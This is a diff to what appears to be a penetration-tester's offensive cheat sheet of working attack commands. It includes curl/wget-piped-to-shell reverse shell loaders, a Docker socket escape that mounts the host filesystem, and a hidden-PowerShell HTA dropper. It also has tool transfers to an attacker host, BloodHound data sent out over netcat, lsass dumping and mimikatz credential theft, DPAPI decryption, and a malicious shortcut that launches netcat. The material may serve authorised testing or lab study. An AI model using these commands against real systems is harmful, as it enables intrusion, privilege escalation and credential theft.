@@ -344,8 +344,8 @@ filename="..//app/app/views.py"
 @app.route('/x')
 def rev():
     import subprocess
-    subprocess.Popen("wget -qO- http://$MYIP:53/resh|sh", shell=True)
-    subprocess.Popen("curl http://$MYIP:53/resh|sh", shell=True)
+    subprocess.Popen("wget -qO- $MYIP/resh|sh", shell=True)
+    subprocess.Popen("curl $MYIP/resh|sh", shell=True)
     return ""
 
 [*] Node.js
@@ -1431,7 +1431,7 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 13
 ## Ligolo - Port Forward and Pivot
 -->> New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
-curl http://$MYIP:53/linux/agent -o agent
+curl $MYIP/linux/agent -o agent
 chmod +x agent;
 ./agent -ignore-cert -connect $MYIP:443
 session
@@ -1639,7 +1639,7 @@ cat /etc/shadow
 +---------- Docker ----------+
 curl -s --unix-socket /var/run/docker.sock http:/./images/json
 curl -s --unix-socket /var/run/docker.sock http:/./containers/json
-curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:53/shells/resh | sh"]}'
+curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl $MYIP/resh|sh"]}'
 curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
 ls -la /var/tmp
 
@@ -1702,7 +1702,8 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/re
 -->> Web Delivery (PowerShell)
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8080; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
--->> Create Malicious .hta Using Web Delivery
+-->> Create and Host Malicious .hta (Web Delivery Payload)
+python3 -m http.server 80 /Upload
 echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta
 
 [*] File Transfer
@@ -1710,18 +1711,23 @@ echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="mi
 python3 -m http.server 139 /Upload
 impacket-smbserver share /Upload/windows
 
--->> Transfer
-curl http://$MYIP/windows/SharpHound.exe -o \programdata\SharpHound.exe
-curl http://$MYIP/windows/nc.exe -o \programdata\nc.exe
-curl http://$MYIP/windows/nc.exe -o \programdata\nc.exe
-curl http://$MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-curl http://$MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
-curl http://$MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
-curl http://$MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
-curl http://$MYIP/bat2exe.bat -o \programdata\bat2exe.bat
-wget http://$MYIP/windows/nc.exe -o \programdata\nc.exe
+-->> Transfer From Linux
+curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
+curl $MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl $MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
+curl $MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
+curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
+curl $MYIP/bat2exe.bat -o \programdata\bat2exe.bat
+wget $MYIP/windows/nc.exe -o \programdata\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
 certutil -urlcache -f http://$MYIP/windows/nc.exe \programdata\nc.exe
+
+-->> Transfer To Linux
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
+\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
+rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
@@ -1731,6 +1737,12 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
+
++---------- Sharphound Data ----------+
+curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
+\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
+rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
 +---------- Ping Sweep /24 ----------+
 //$MYIP/$/ping.bat 192.168.210.X
@@ -1758,7 +1770,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/Invoke-RunasCs.ps
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
 +---------- DPAPI ----------+
-curl http://$MYIP:53/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
 dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
@@ -1781,8 +1793,8 @@ xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $M
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
 
 +---------- SeDebugPrivilege ----------+
-curl http://$MYIP:53/windows/procdump64.exe -o \programdata\procdump.exe; \programdata\procdump.exe -accepteula -ma lsass.exe lsass.dmp
-curl http://$MYIP:53/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+curl $MYIP/windows/procdump64.exe -o \programdata\procdump.exe; \programdata\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 vault::cred
@@ -1796,7 +1808,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o /Upload
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
 +---------- Malicious .lnk ----------+
-curl http://$MYIP:53/windows/nc.exe -o \programdata\nc.exe
+curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"
 
